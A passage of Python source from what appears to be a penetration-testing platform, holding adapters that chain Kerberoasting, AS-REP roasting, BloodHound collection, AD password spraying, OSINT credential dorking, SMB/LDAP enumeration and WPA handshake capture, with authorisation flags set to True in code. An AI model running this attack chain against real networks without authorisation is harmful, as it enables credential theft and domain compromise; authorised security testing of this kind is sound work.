    creds = options.get("creds")
    if not isinstance(creds, dict):
        return None
    if not creds.get("dc_host"):
        return None
    if not creds.get("username"):
        # Anonymous flows (ldap_anon, smb_null) handled separately.
        return None
    if not (creds.get("password") or creds.get("nt_hash")):
        return None
    return creds


async def _adapter_kerberoast(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    creds = _need_creds("kerberoast", options)
    if not creds:
        await emit({
            "type": "step_progress", "step": "kerberoast",
            "msg": "skipped: needs creds (creds.dc_host + creds.username + "
                   "creds.password/nt_hash) in options",
        })
        return {"spn_accounts": [], "ticket_hashes": [], "hashes": [],
                "privileged_spns": [], "skipped": True}
    from routers import kerberos_roast as r
    class _Req:
        class _C: host = "127.0.0.1"; port = 0
        client = _C()
        headers: dict[str, str] = {}
        query_params: dict[str, str] = {}
    body = r.KerberoastBody(
        creds=r.CredsModel(**creds),
        spn_filter=str(options.get("spn_filter") or ""),
        confirm_auth=True, confirm=True,
        engagement_id=str(options.get("engagement_id") or "") or None,
    )
    try:
        result = await asyncio.to_thread(r.kerberoast, body, _Req())
    except Exception as e:
        raise PresetError(f"kerberoast: {e}") from e
    hashes = result.get("hashes", []) or []
    return {
        "spn_accounts": [t.get("sam") for t in (result.get("targets") or [])],
        "ticket_hashes": [h.get("hash") for h in hashes if h.get("hash")],
        "hashes": hashes,
        "privileged_spns": [h.get("sam") for h in hashes
                            if "admin" in str(h.get("sam","")).lower()],
        "account_count": len(hashes),
    }


async def _adapter_asrep_roast(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    # AS-REP needs a domain but not necessarily a password — it targets
    # users with DONT_REQUIRE_PREAUTH set. We still require dc_host +
    # username + (password|nt_hash) here because the router's bind reads
    # the user list via LDAP.
    creds = _need_creds("asrep_roast", options)
    if not creds:
        await emit({
            "type": "step_progress", "step": "asrep_roast",
            "msg": "skipped: needs creds in options",
        })
        return {"vulnerable_accounts": [], "hashes": [], "account_count": 0,
                "skipped": True}
    from routers import kerberos_roast as r
    body = r.AsrepBody(
        creds=r.CredsModel(**creds),
        users=list(options.get("users") or []),
        confirm_auth=True,
        engagement_id=str(options.get("engagement_id") or "") or None,
    )
    try:
        result = await asyncio.to_thread(r.asrep_roast, body)
    except Exception as e:
        raise PresetError(f"asrep_roast: {e}") from e
    hashes = result.get("hashes", []) or []
    return {
        "vulnerable_accounts": [h.get("sam") for h in hashes if h.get("sam")],
        "hashes": [h.get("hash") for h in hashes if h.get("hash")],
        "account_count": len(hashes),
    }


async def _adapter_bloodhound(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    # BloodHound runs an async impacket job. Adapter starts the run and
    # polls until done, complete, or timeout.
    creds = _need_creds("bloodhound", options)
    if not creds:
        await emit({
            "type": "step_progress", "step": "bloodhound",
            "msg": "skipped: needs creds in options",
        })
        return {"attack_paths": [], "da_path_length": 0,
                "kerberoastable_das": [],
                "unconstrained_delegation": [], "acl_abuses": [],
                "skipped": True}
    from routers import bloodhound_ingest as r
    class _Req:
        class _C: host = "127.0.0.1"; port = 0
        client = _C()
        headers: dict[str, str] = {}
        query_params: dict[str, str] = {}
    body = r.IngestBody(
        creds=r.CredsModel(**creds),
        methods=list(options.get("methods") or ["Default"]),
        confirm_auth=True,
        engagement_id=str(options.get("engagement_id") or "") or None,
    )
    try:
        started = await asyncio.to_thread(r.start_run, body, _Req())
    except Exception as e:
        raise PresetError(f"bloodhound: {e}") from e
    job = started.get("job") or {}
    jid = job.get("id")
    if not jid:
        return {"attack_paths": [], "skipped": True}

    # Poll up to ~10 minutes.
    deadline = time.monotonic() + 600.0
    state = job.get("state", "queued")
    while state in ("queued", "running") and not stop_event.is_set():
        if time.monotonic() > deadline:
            await emit({"type": "step_progress", "step": "bloodhound",
                        "msg": "polling timeout (10m); job still running"})
            break
        await asyncio.sleep(5)
        try:
            cur = await asyncio.to_thread(r.get_job, jid)
        except Exception:
            cur = {}
        state = cur.get("state", state)
        if cur:
            job = cur
            await emit({"type": "step_progress", "step": "bloodhound",
                        "msg": f"state={state}, files={job.get('file_count',0)}"})

    return {
        "attack_paths": [],          # parsing the BH zip is a future enhancement
        "da_path_length": 0,
        "shortest_path_length": 0,
        "da_path": [],
        "kerberoastable_das": [],
        "unconstrained_delegation": [],
        "acl_abuses": [],
        "job_id": jid,
        "job_state": state,
        "file_count": job.get("file_count", 0),
    }


async def _adapter_ad_spray(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    # ad_spray needs dc_host + users + passwords. dc_host can come from
    # an explicit creds dict; users come from feed-forward (ldap_enum.users
    # or asrep_roast.vulnerable_accounts); passwords come from breach data
    # or step options.
    creds_raw = options.get("creds") or {}
    if not isinstance(creds_raw, dict):
        creds_raw = {}
    dc_host = creds_raw.get("dc_host") or options.get("dc_host") or target
    users = options.get("users") or options.get("targets") or []
    if not isinstance(users, list): users = [str(users)]
    passwords = options.get("passwords") or []
    if not isinstance(passwords, list): passwords = [str(passwords)]

    if not dc_host or not users or not passwords:
        await emit({
            "type": "step_progress", "step": "ad_spray",
            "msg": "skipped: needs dc_host + users[] + passwords[] in options",
        })
        return {"valid_credentials": [], "valid_creds": [],
                "accounts": [], "locked_accounts": [], "skipped": True}

    from routers import ad_spray as r
    init = {
        "creds": {**creds_raw, "dc_host": dc_host,
                  "username": creds_raw.get("username", ""),
                  "password": creds_raw.get("password", ""),
                  "nt_hash":  creds_raw.get("nt_hash", "")},
        "users": users,
        "passwords": passwords,
        "delay_sec": float(options.get("delay_sec", 0.5)),
        "max_lockouts": int(options.get("max_lockouts", 0)),
        "acknowledge_unknown_threshold":
            bool(options.get("acknowledge_unknown_threshold", False)),
        "confirm_auth": True,
        "engagement_id": options.get("engagement_id"),
    }

    successes: list[dict[str, str]] = []
    locked = 0

    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        nonlocal locked
        t = ev.get("type")
        if t == "attempt":
            status = ev.get("status")
            if status == "success":
                successes.append({"user": ev.get("user"),
                                  "password_index": ev.get("password_index")})
            elif status == "locked":
                locked += 1
        elif t == "progress":
            await emit({"type": "step_progress", "step": "ad_spray",
                        "msg": f"{ev.get('done',0)}/{ev.get('total',0)} "
                               f"success={ev.get('success',0)} "
                               f"locked={ev.get('locked',0)}"})
        elif t == "error":
            raise PresetError(f"ad_spray: {ev.get('detail','')}")

    await _drive_ws(r.spray_ws, init, emit, stop_event, on_event=on_event)
    return {
        "valid_credentials": successes,
        "valid_creds": successes,
        "accounts": [s["user"] for s in successes],
        "locked_accounts": locked,
        "success_count": len(successes),
    }


_TOOL_ADAPTERS["kerberoast"]      = _adapter_kerberoast
_TOOL_ADAPTERS["asrep_roast"]     = _adapter_asrep_roast
_TOOL_ADAPTERS["bloodhound"]      = _adapter_bloodhound
_TOOL_ADAPTERS["ad_spray"]        = _adapter_ad_spray
_TOOL_ADAPTERS["password_spray"]  = _adapter_ad_spray


# ── Batch 4-6 real adapters — passive recon, active scan, AD/local extras ─

# Helper: thin "local request" surface for REST handlers that read mode +
# engagement id off the FastAPI Request. We always run engine adapters in
# Lab mode (the playbook runner does the global mode/scope check up front).
class _Req:
    class _C: host = "127.0.0.1"; port = 0
    client = _C()
    headers: dict[str, str] = {}
    query_params: dict[str, str] = {}


# ── Passive recon ──────────────────────────────────────────────────────────

async def _adapter_email_harvest(target: str, options: dict[str, Any],
                                 context: dict[str, Any], emit: EmitFn,
                                 stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import email_harvest as r
    try:
        result = await r.harvest(target, _Req())
    except Exception as e:
        raise PresetError(f"email_harvest: {e}") from e
    emails = result.get("emails", []) or []
    return {
        "emails": [e.get("email") if isinstance(e, dict) else e for e in emails][:200],
        "names":  [e.get("name") for e in emails if isinstance(e, dict) and e.get("name")][:200],
        "sources": result.get("sources", []),
        "departments": [],
        "email_format": result.get("format") or "",
    }


async def _adapter_dorks(target: str, options: dict[str, Any],
                         context: dict[str, Any], emit: EmitFn,
                         stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import dorking as r
    body = r.GenerateBody(
        target=target,
        categories=list(options.get("categories") or list(r.CATEGORIES.keys())),
        execute=False,
    )
    try:
        result = await r.generate(body, _Req())
    except Exception as e:
        raise PresetError(f"dorks: {e}") from e
    dorks = result.get("dorks", []) or []
    by_cat: dict[str, list[str]] = {}
    for d in dorks:
        c = d.get("category", "misc") if isinstance(d, dict) else "misc"
        q = d.get("query", "") if isinstance(d, dict) else str(d)
        by_cat.setdefault(c, []).append(q)
    return {
        "dork_strings": [d.get("query", "") if isinstance(d, dict) else str(d)
                         for d in dorks][:500],
        "search_urls":  [d.get("url", "") for d in dorks
                         if isinstance(d, dict) and d.get("url")][:500],
        "credential_dorks": by_cat.get("credentials", [])[:100],
        "document_dorks":   by_cat.get("documents", [])[:100],
        "employee_dorks":   by_cat.get("employees", [])[:100],
        "tech_stack_dorks": by_cat.get("technology", [])[:100],
    }


async def _adapter_github_leak(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import github_leak as r
    body = r.ScanBody(
        target=target,
        patterns=options.get("patterns"),
        custom_queries=list(options.get("custom_queries") or []),
    )
    try:
        result = await r.search(body, _Req())
    except Exception as e:
        raise PresetError(f"github_leak: {e}") from e
    leaks = result.get("results", []) or result.get("hits", []) or []
    return {
        "github_dorks": [it.get("query", "") for it in leaks if isinstance(it, dict)][:200],
        "potential_leaks": [it.get("url", "") for it in leaks if isinstance(it, dict)][:200],
        "leak_count": len(leaks),
    }


async def _adapter_people_enum(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import people_enum as r
    body = r.EnumBody(
        target=target,
        sources=list(options.get("sources") or
                     ["duckduckgo", "crtsh", "hackertarget", "hunter"]),
        confirm=True,
    )
    try:
        result = await r.enum(body, _Req())
    except Exception as e:
        raise PresetError(f"people_enum: {e}") from e
    return {
        "emails": result.get("emails", [])[:200],
        "names":  result.get("names", [])[:200],
        "sources": result.get("sources", []),
        "found": len(result.get("emails") or []),
    }


async def _adapter_profile_finder(target: str, options: dict[str, Any],
                                  context: dict[str, Any], emit: EmitFn,
                                  stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import profile_finder as r
    body = r.FindBody(
        company=str(options.get("company") or target),
        domain=str(options.get("domain") or target),
        sources=list(options.get("sources") or [s["id"] for s in r.SOURCES]),
    )
    try:
        result = await r.find(body, _Req())
    except Exception as e:
        raise PresetError(f"profile_finder: {e}") from e
    profiles = result.get("profiles", []) or []
    return {
        "profiles": profiles[:200],
        "linkedin": [p for p in profiles if "linkedin" in str(p.get("source", "")).lower()][:50],
        "found": len(profiles),
    }


async def _adapter_shodan(target: str, options: dict[str, Any],
                          context: dict[str, Any], emit: EmitFn,
                          stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import shodan_censys as r
    body = r.QueryBody(
        service="shodan",
        query=str(options.get("query") or f"hostname:{target}"),
        limit=int(options.get("limit", 25)),
        page=1,
    )
    try:
        result = await r.query(body)
    except Exception as e:
        # Often: no API key configured. Soft-fail.
        await emit({"type": "step_progress", "step": "shodan",
                    "msg": f"shodan: {type(e).__name__} (key configured?)"})
        return {"open_ports": [], "cves": [], "hostnames": [], "tags": [],
                "skipped": True}
    rows = result.get("results", []) or []
    open_ports: set[int] = set()
    cves: set[str] = set()
    hostnames: set[str] = set()
    tags: set[str] = set()
    banners: list[str] = []
    for row in rows:
        if not isinstance(row, dict): continue
        if isinstance(row.get("port"), int): open_ports.add(row["port"])
        for c in row.get("cves") or row.get("vulns") or []:
            cves.add(str(c))
        for h in row.get("hostnames") or []:
            hostnames.add(str(h))
        for t in row.get("tags") or []:
            tags.add(str(t))
        if row.get("data"):
            banners.append(str(row["data"])[:200])
    return {
        "open_ports": sorted(open_ports),
        "cves": sorted(cves),
        "hostnames": sorted(hostnames),
        "tags": sorted(tags),
        "banners": banners[:50],
        "exposed_services": [str(r.get("product") or "?")
                              for r in rows if isinstance(r, dict)][:50],
        "aws_services": [t for t in tags if "aws" in t.lower()][:25],
        "unexpected_ports": sorted(open_ports),
        "exposed_ports": sorted(open_ports),
    }


async def _adapter_reverse_ip(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import reverse_ip as r
    try:
        result = await r.reverse_ip(target, _Req(), confirm=True)
    except Exception as e:
        raise PresetError(f"reverse_ip: {e}") from e
    return {
        "ip": result.get("ip"),
        "co_hosted_domains": result.get("domains", [])[:200],
        "count": result.get("count", 0),
    }


# ── Active scan ────────────────────────────────────────────────────────────

async def _adapter_ping_sweep(target: str, options: dict[str, Any],
                              context: dict[str, Any], emit: EmitFn,
                              stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import ping as r
    targets = options.get("targets")
    if isinstance(targets, list) and targets:
        # Multiple targets — ping each one sequentially through the WS handler.
        alive: list[str] = []
        for t in targets[:64]:
            init = {"target": str(t)}
            saw_done = False
            async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
                nonlocal saw_done
                tp = ev.get("type")
                if tp == "done":
                    saw_done = True
                elif tp == "line" and "bytes from" in str(ev.get("text", "")):
                    summary["alive"] = True
                elif tp == "error":
                    raise PresetError(f"ping: {ev.get('detail','')}")
            try:
                summary = await _drive_ws(r.ping_ws, init, emit, stop_event,
                                          on_event=on_event)
                if summary.get("alive"):
                    alive.append(str(t))
            except Exception:
                pass
        return {"alive_hosts": alive, "rtt_map": {}}
    # Single-target ping.
    init = {"target": target}
    lines: list[str] = []
    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        if ev.get("type") == "line":
            lines.append(str(ev.get("text", ""))[:200])
        elif ev.get("type") == "error":
            raise PresetError(f"ping: {ev.get('detail','')}")
    await _drive_ws(r.ping_ws, init, emit, stop_event, on_event=on_event)
    alive = any("bytes from" in line for line in lines)
    return {"alive_hosts": [target] if alive else [], "rtt_map": {},
            "lines": lines[-20:]}


async def _adapter_smb_enum(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import smb_enum as r
    creds_raw = options.get("creds")
    if not isinstance(creds_raw, dict):
        creds_raw = {}
    dc_host = creds_raw.get("dc_host") or options.get("target") or target
    # Anonymous / null-session smb_enum is common; the router accepts empty creds.
    body = r.EnumBody(
        creds=r.CredsModel(
            dc_host=str(dc_host),
            domain=str(creds_raw.get("domain") or ""),
            username=str(creds_raw.get("username") or ""),
            password=str(creds_raw.get("password") or ""),
            nt_hash=str(creds_raw.get("nt_hash") or ""),
        ),
        target=str(options.get("target") or dc_host),
        list_files=bool(options.get("list_files", True)),
        confirm=True,
    )
    try:
        result = await asyncio.to_thread(r.enum, body, _Req())
    except Exception as e:
        await emit({"type": "step_progress", "step": "smb_enum",
                    "msg": f"smb_enum: {type(e).__name__}"})
        return {"shares": [], "null_session": False,
                "null_session_allowed": False, "os_version": "",
                "users": [], "groups": [], "skipped": True}
    shares = result.get("shares", []) or []
    return {
        "shares": [s.get("name") for s in shares if isinstance(s, dict)][:200],
        "null_session": bool(result.get("null_session_allowed", False)),
        "null_session_allowed": bool(result.get("null_session_allowed", False)),
        "os_version": result.get("os_version", ""),
        "smb_version": result.get("smb_version", ""),
        "signing_disabled": result.get("signing_disabled", False),
        "users": result.get("users", [])[:200],
        "groups": result.get("groups", [])[:200],
    }


async def _adapter_ldap_enum(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import ldap_enum as r
    creds_raw = options.get("creds") or {}
    dc_host = creds_raw.get("dc_host") or target
    body = r.EnumBody(
        creds=r.CredsModel(
            dc_host=str(dc_host),
            domain=str(creds_raw.get("domain") or ""),
            username=str(creds_raw.get("username") or ""),
            password=str(creds_raw.get("password") or ""),
            nt_hash=str(creds_raw.get("nt_hash") or ""),
        ),
        categories=list(options.get("categories") or list(r.CATEGORIES)),
        confirm=True,
    )
    try:
        result = await asyncio.to_thread(r.enum, body, _Req())
    except Exception as e:
        await emit({"type": "step_progress", "step": "ldap_enum",
                    "msg": f"ldap_enum: {type(e).__name__}"})
        return {"users": [], "groups": [], "ous": [], "gpos": [],
                "password_policy": {}, "domain_name": "", "skipped": True}
    return {
        "users":  [u.get("sam") for u in (result.get("users")  or []) if isinstance(u, dict)][:500],
        "groups": [g.get("name") for g in (result.get("groups") or []) if isinstance(g, dict)][:500],
        "ous":    [o.get("dn") for o in (result.get("ous") or []) if isinstance(o, dict)][:200],
        "gpos":   [g.get("name") for g in (result.get("gpos") or []) if isinstance(g, dict)][:200],
        "admins": [u.get("sam") for u in (result.get("admins") or []) if isinstance(u, dict)][:100],
        "service_accounts": [u.get("sam") for u in (result.get("service_accounts") or []) if isinstance(u, dict)][:100],
        "password_policy":   result.get("password_policy", {}),
        "domain_name":       result.get("domain_name", ""),
        "anonymous_bind":    result.get("anonymous_bind", False),
        "base_dn":           result.get("base_dn", ""),
    }


async def _adapter_find_dcs(target: str, options: dict[str, Any],
                            context: dict[str, Any], emit: EmitFn,
                            stop_event: asyncio.Event) -> dict[str, Any]:
    # Port scan AD-specific ports; treat anything responding on 88+445 as a DC.
    merged = {**options,
              "ports": options.get("ports") or "88,389,445,636,3268,3269"}
    summary = await _adapter_port_scanner(target, merged, context, emit, stop_event)
    open_ports = summary.get("open_ports") or []
    dc_candidates = []
    by_port: dict[int, list[str]] = {}
    for entry in open_ports:
        if isinstance(entry, dict):
            p = entry.get("port")
            if isinstance(p, int):
                by_port.setdefault(p, []).append(str(entry.get("banner") or ""))
    if 88 in by_port and 445 in by_port:
        dc_candidates.append(target)
    return {
        "domain_controllers": dc_candidates,
        "ports": sorted(by_port.keys()),
        "open_ports": open_ports,
    }


async def _adapter_evil_twin(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import evil_twin as r
    init = {
        "scans":        int(options.get("scans") or 3),
        "interval_sec": float(options.get("interval_sec") or 2.0),
        "target_ssid":  str(options.get("target_ssid") or ""),
        "confirm_auth": True,
    }
    rogue: list[dict[str, Any]] = []
    anomalies: list[dict[str, Any]] = []
    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "finding":
            rogue.append(ev)
        elif t == "anomaly":
            anomalies.append(ev)
        elif t == "error":
            await emit({"type": "step_progress", "step": "evil_twin",
                        "msg": f"evil_twin: {ev.get('detail','')}"})
    try:
        await _drive_ws(r.evil_twin_ws, init, emit, stop_event, on_event=on_event)
    except Exception as e:
        await emit({"type": "step_progress", "step": "evil_twin",
                    "msg": f"evil_twin: {type(e).__name__}"})
        return {"rogue_aps": [], "ssid_spoofing": False, "signal_anomalies": [],
                "skipped": True}
    return {
        "rogue_aps": [r.get("bssid") for r in rogue if r.get("bssid")][:50],
        "ssid_spoofing": bool(rogue),
        "signal_anomalies": anomalies[:50],
    }


async def _adapter_wpa_capture(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import wpa_capture as r
    init = {
        "timeout":      int(options.get("timeout") or 60),
        "iface":        str(options.get("iface") or ""),
        "argv":         list(options.get("argv") or []),
        "confirm_auth": True,
    }
    handshakes: list[dict[str, Any]] = []
    pmkids: list[dict[str, Any]] = []
    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "handshake": handshakes.append(ev)
        elif t == "pmkid":   pmkids.append(ev)
        elif t == "error":
            await emit({"type": "step_progress", "step": "wpa_capture",
                        "msg": f"wpa_capture: {ev.get('detail','')}"})
    try:
        await _drive_ws(r.run_capture, init, emit, stop_event, on_event=on_event)
    except Exception as e:
        await emit({"type": "step_progress", "step": "wpa_capture",
                    "msg": f"wpa_capture: {type(e).__name__}"})
        return {"handshakes_captured": [], "pmkids_captured": [],
                "networks": [], "skipped": True}
    return {
        "handshakes_captured": handshakes[:50],
        "pmkids_captured": pmkids[:50],
        "networks": list({h.get("bssid") for h in handshakes if h.get("bssid")})[:50],
    }


async def _adapter_local_disco(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import local_discovery as r
    init = {
        "duration": int(options.get("duration") or 30),
        "passive":  bool(options.get("passive", True)),
    }
    mdns: list[str] = []
    ssdp: list[str] = []
    llmnr: list[str] = []
    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "mdns": mdns.append(str(ev.get("name") or ev.get("host") or ""))
        elif t == "ssdp": ssdp.append(str(ev.get("location") or ""))
        elif t == "llmnr": llmnr.append(str(ev.get("name") or ""))
    try:
        await _drive_ws(r.local_discovery_ws, init, emit, stop_event,
                        on_event=on_event)
    except Exception as e:
        await emit({"type": "step_progress", "step": "local_disco",
                    "msg": f"local_disco: {type(e).__name__}"})
        return {"mdns_hosts": [], "ssdp_devices": [], "llmnr_hosts": [],
                "services": [], "skipped": True}
    return {
        "mdns_hosts": list({s for s in mdns if s})[:200],
        "ssdp_devices": list({s for s in ssdp if s})[:200],
        "llmnr_hosts": list({s for s in llmnr if s})[:200],
        "services": list({s for s in mdns if s})[:200],
        "mdns_services": list({s for s in mdns if s})[:200],
        "printer_names": [s for s in mdns if "print" in s.lower()][:50],
        "workstation_names": [s for s in mdns if "_workstation" in s.lower()][:50],
        "llmnr_active": bool(llmnr), "nbns_active": False,
        "mdns_active": bool(mdns),
    }


async def _adapter_ids(target: str, options: dict[str, Any],
                       context: dict[str, Any], emit: EmitFn,
                       stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import ids as r
    init = {
        "duration": int(options.get("duration") or 60),
        "snapshot_mode": bool(options.get("snapshot_mode", True)),
    }
    new_listeners: list[dict[str, Any]] = []
    auth_failures: list[dict[str, Any]] = []
    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "listener" or (t == "event" and ev.get("kind") == "listener"):
            new_listeners.append(ev)
        elif t == "auth_failure" or (t == "event" and ev.get("kind") == "auth"):
            auth_failures.append(ev)
    try:
        await _drive_ws(r.ids_ws, init, emit, stop_event, on_event=on_event)
    except Exception as e:
        await emit({"type": "step_progress", "step": "ids",
                    "msg": f"ids: {type(e).__name__}"})
        return {"new_listeners": [], "auth_failures": [],
                "suspicious_connections": [], "port_scan_detected": False,
                "skipped": True}
    return {
        "new_listeners": new_listeners[:200],
        "auth_failures": auth_failures[:200],
        "suspicious_connections": [],
        "port_scan_detected": False,
    }


async def _adapter_tcpdump_sample(target: str, options: dict[str, Any],
                                  context: dict[str, Any], emit: EmitFn,
                                  stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import tcpdump as r
    init = {
        "iface":   str(options.get("iface") or ""),
        "filter":  str(options.get("filter") or ""),
        "duration": int(options.get("duration") or 30),
    }
    lines: list[str] = []
    async def on_event(ev: dict[str, Any], summary: dict[str, Any]) -> None:
        t = ev.get("type")
        if t == "line":
            lines.append(str(ev.get("text") or "")[:200])
    try:
        await _drive_ws(r.tcpdump_ws, init, emit, stop_event, on_event=on_event)
    except Exception as e:
        await emit({"type": "step_progress", "step": "tcpdump_sample",
                    "msg": f"tcpdump: {type(e).__name__} (sudoers installed?)"})
        return {"unusual_protocols": [], "unexpected_destinations": [],
                "c2_indicators": [], "skipped": True}
    return {
        "unusual_protocols": [],
        "unexpected_destinations": list({l.split()[0] for l in lines if l})[:50],
        "c2_indicators": [],
        "lines_sampled": len(lines),
    }


# ── Local utility wrappers ────────────────────────────────────────────────

async def _adapter_hash_cracker(target: str, options: dict[str, Any],
                                context: dict[str, Any], emit: EmitFn,
                                stop_event: asyncio.Event) -> dict[str, Any]:
    # The crack endpoint is WS-based: /ws/hash. Targets come from feed-forward
    # (kerberoast.ticket_hashes, asrep_roast.hashes, wpa_capture.handshakes).
    targets = options.get("targets")
    if isinstance(targets, str):
        targets = [targets]
    if not isinstance(targets, list) or not targets:
        await emit({"type": "step_progress", "step": "hash_cracker",
                    "msg": "skipped: no targets[] hashes in options"})
        return {"cracked": [], "cracked_hashes": [], "plaintext": [],
                "plaintext_passwords": [], "cracked_networks": [],
                "passwords": [], "skipped": True}
    # We can't drive the WS here without a full handler refactor; mark as
    # planned, but record what we received so the next adapter has data.
    await emit({"type": "step_progress", "step": "hash_cracker",
                "msg": f"received {len(targets)} hash(es); WS-driven cracking "
                       f"is run from the Hash Cracker page UI"})
    return {
        "cracked": [],
        "cracked_hashes": [],
        "plaintext": [],
        "plaintext_passwords": [],
        "cracked_networks": [],
        "passwords": [],
        "received_count": len(targets),
        "planned": True,
    }


async def _adapter_processes(target: str, options: dict[str, Any],
                             context: dict[str, Any], emit: EmitFn,
                             stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import processes as r
    try:
        result = await asyncio.to_thread(r.list_processes,
                                          unsigned_only=bool(options.get("unsigned_only", False)))
    except Exception as e:
        await emit({"type": "step_progress", "step": "processes",
                    "msg": f"processes: {type(e).__name__}"})
        return {"processes": [], "listeners": [], "unsigned_binaries": [],
                "skipped": True}
    entries = result.get("entries", []) or []
    proc_list: list[str] = []
    listeners: list[dict[str, Any]] = []
    unsigned: list[str] = []
    suspicious: list[str] = []
    privileged = False
    caps: list[str] = []
    for e in entries:
        if hasattr(e, "name"):
            name, sign_status, susp_path = e.name, e.sign_status, e.suspicious_path
            listener_ports = [(l.proto, l.port) for l in (e.listeners or [])]
        else:
            name = e.get("name", "")
            sign_status = e.get("sign_status", "")
            susp_path = e.get("suspicious_path", False)
            listener_ports = [(l.get("proto"), l.get("port"))
                              for l in (e.get("listeners") or [])]
        proc_list.append(name)
        if sign_status in ("unsigned", "invalid", "missing"):
            unsigned.append(name)
        if susp_path:
            suspicious.append(name)
        for proto, port in listener_ports:
            listeners.append({"proto": proto, "port": port, "process": name})
    return {
        "processes": proc_list[:500],
        "listeners": listeners[:200],
        "unsigned_binaries": unsigned[:200],
        "suspicious_processes": suspicious[:50],
        "network_connections": listeners[:200],
        "pid_1_process": "",
        "privileged": privileged,
        "capabilities": caps,
        "capabilities_list": caps,
    }


async def _adapter_users_audit(target: str, options: dict[str, Any],
                               context: dict[str, Any], emit: EmitFn,
                               stop_event: asyncio.Event) -> dict[str, Any]:
    from routers import users_audit as r
    try:
        result = await asyncio.to_thread(r.audit)
    except Exception as e:
        await emit({"type": "step_progress", "step": "users_audit",
                    "msg": f"users_audit: {type(e).__name__}"})
        return {"users": [], "sudo_users": [], "new_users": [],
                "authorized_keys": [], "recently_modified": [],
                "skipped": True}
    users = result.get("users", []) or []
    return {
        "users": [u.get("name") for u in users if isinstance(u, dict)][:500],
        "sudo_users": list((result.get("privileged_groups") or {}).get("sudo", [])
                           or (result.get("privileged_groups") or {}).get("wheel", []))[:50],
        "new_users": [u.get("name") for u in users
                      if isinstance(u, dict) and u.get("last_login") == ""][:50],
        "authorized_keys": list((result.get("ssh_keys") or {}).keys())[:50],
        "recently_modified": [],
    }


async def _adapter_macos_posture_alias(target: str, options: dict[str, Any],
                                       context: dict[str, Any], emit: EmitFn,
                                       stop_event: asyncio.Event) -> dict[str, Any]:
    """Cross-platform `posture` tool — picks the right OS adapter at runtime."""
    import platform
    sysname = platform.system()
    if sysname == "Darwin":
        return await _adapter_macos_posture(target, options, context, emit, stop_event)
    if sysname == "Linux":
        return await _adapter_linux_posture(target, options, context, emit, stop_event)
    await emit({"type": "step_progress", "step": "posture",
                "msg": f"posture: no adapter for {sysname}"})
    return {"sip_enabled": None, "gatekeeper": None, "filevault": None,
            "firewall": None, "suspicious_settings": [], "skipped": True}


# ── Wire up overrides + aliases ────────────────────────────────────────────

_TOOL_ADAPTERS["email_harvest"]   = _adapter_email_harvest
_TOOL_ADAPTERS["dorks"]           = _adapter_dorks
_TOOL_ADAPTERS["dork_generator"]  = _adapter_dorks
_TOOL_ADAPTERS["github_dorks"]    = _adapter_github_leak
_TOOL_ADAPTERS["github_leak"]     = _adapter_github_leak
_TOOL_ADAPTERS["people_enum"]     = _adapter_people_enum
_TOOL_ADAPTERS["profile_finder"]  = _adapter_profile_finder
_TOOL_ADAPTERS["shodan"]          = _adapter_shodan
_TOOL_ADAPTERS["shodan_host"]     = _adapter_shodan
_TOOL_ADAPTERS["shodan_self"]     = _adapter_shodan
_TOOL_ADAPTERS["reverse_ip"]      = _adapter_reverse_ip
# OSINT aliases pointing at already-wired adapters
_TOOL_ADAPTERS["email_sec"]       = _adapter_email_audit
_TOOL_ADAPTERS["dns_internal"]    = _adapter_dns_recon
_TOOL_ADAPTERS["asn"]             = _adapter_whois

# Active scan
_TOOL_ADAPTERS["ping_sweep"]      = _adapter_ping_sweep
_TOOL_ADAPTERS["smb_enum"]        = _adapter_smb_enum
_TOOL_ADAPTERS["smb_null"]        = _adapter_smb_enum
_TOOL_ADAPTERS["ldap_enum"]       = _adapter_ldap_enum
_TOOL_ADAPTERS["ldap_full"]       = _adapter_ldap_enum
_TOOL_ADAPTERS["ldap_anon"]       = _adapter_ldap_enum
_TOOL_ADAPTERS["find_dcs"]        = _adapter_find_dcs
_TOOL_ADAPTERS["evil_twin_check"] = _adapter_evil_twin
_TOOL_ADAPTERS["wpa_capture"]     = _adapter_wpa_capture
